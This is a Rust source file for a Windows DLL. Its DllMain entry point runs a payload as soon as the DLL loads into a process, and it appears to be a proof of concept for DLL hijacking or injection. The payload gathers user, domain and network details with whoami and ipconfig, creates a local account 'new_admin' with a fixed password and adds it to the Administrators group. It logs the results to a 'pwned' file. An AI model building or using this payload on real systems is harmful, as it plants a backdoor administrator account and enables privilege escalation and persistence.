#![cfg(windows)]
use std::io::Write;
use winapi::shared::minwindef;
use winapi::shared::minwindef::{BOOL, DWORD, HINSTANCE, LPVOID};
use std::fs::File;
use std::env;
use std::fs;
use std::process::Command;

/// Entry point which will be called by the system once the DLL has been loaded
/// in the target process. Declaring this function is optional.
///
/// # Safety
///
/// What you can safely do inside here is very limited, see the Microsoft documentation
/// about "DllMain". Rust also doesn't officially support a "life before main()",
/// though it is unclear what that that means exactly for DllMain.
#[no_mangle]
#[allow(non_snake_case, unused_variables)]
extern "system" fn DllMain(
    dll_module: HINSTANCE,
    call_reason: DWORD,
    reserved: LPVOID)
    -> BOOL
{
    const DLL_PROCESS_ATTACH: DWORD = 1;
    const DLL_PROCESS_DETACH: DWORD = 0;
    match call_reason {
        DLL_PROCESS_ATTACH => do_work(),
        DLL_PROCESS_DETACH => (),
        _ => ()
    }
    minwindef::TRUE
}

fn do_work() {
    let test_path = "c:\\temp";
    fs::create_dir_all(test_path).unwrap();
    let pid = std::process::id().to_string();
    let username = env::var("USERNAME").unwrap();
    let domain = env::var("USERDOMAIN").unwrap();
    let path = format!("{}\\pwned_{}.txt", test_path, pid);
    let process_path = std::env::current_exe().unwrap();
    let args: Vec<String> = std::env::args().collect();
    
    // Execute whoami command and capture output
    let whoami_output = Command::new("whoami")
        .output()
        .expect("Failed to execute whoami");
    
    let whoami_result = String::from_utf8_lossy(&whoami_output.stdout);
    
    // Execute any other command you'd like, e.g., ipconfig
    let ipconfig_output = Command::new("cmd")
        .args(&["/c", "ipconfig"])
        .output()
        .expect("Failed to execute ipconfig");
    
    let ipconfig_result = String::from_utf8_lossy(&ipconfig_output.stdout);

    // Add a new user
    let useradd_output = Command::new("cmd")
        .args(&["/c", "net user new_admin Password123! /add"])
        .output()
        .expect("Failed to execute net user add");
    
    let useradd_result = String::from_utf8_lossy(&useradd_output.stdout);
    
    // Add user to local administrators group
    let groupadd_output = Command::new("cmd")
        .args(&["/c", "net localgroup Administrators new_admin /add"])
        .output()
        .expect("Failed to execute net user add");
    
    let groupadd_result = String::from_utf8_lossy(&groupadd_output.stdout);

    let output = format!(
    "[*]          Pid: {}\n\
     [*]      Process: {:?}\n\
     [*]         Args: {:?}\n\
     [*]         User: {}\n\
     [*]       Domain: {}\n\
     [*] Created file: {:?}\n\
     \n\
     [*] Whoami Output:\n\
     {}\n\
     \n\
     [*] IP Config:\n\
     {}\n\
     \n\
     [*] Net User Add Output:\n\
     {}\n\
     \n\
     [*] Net Group Add Output:\n\
     {}\n",
    pid,
    process_path,
    &args[1..],
    username,
    domain,
    path,
    whoami_result.trim(),
    ipconfig_result.trim(),
    useradd_result.trim(),
    groupadd_result.trim()
);

println!("{}", output);

let mut file = File::create(&path).unwrap();
file.write_all(output.as_bytes()).unwrap();
}